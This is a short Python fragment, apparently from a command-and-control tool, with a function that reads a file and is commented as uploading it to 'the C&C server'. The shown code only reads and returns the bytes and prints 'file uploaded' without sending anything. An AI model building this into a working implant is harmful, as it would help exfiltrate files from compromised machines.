from termcolor import colored

def execute_file_upload(filename):
    try:
        with open(filename, 'rb') as f:
            data = f.read()
        print("file uploaded")
        # Upload the file to the C&C server
        return data
    except Exception as e:
                return colored(f"Error running command upload: {str(e)}" , "red")

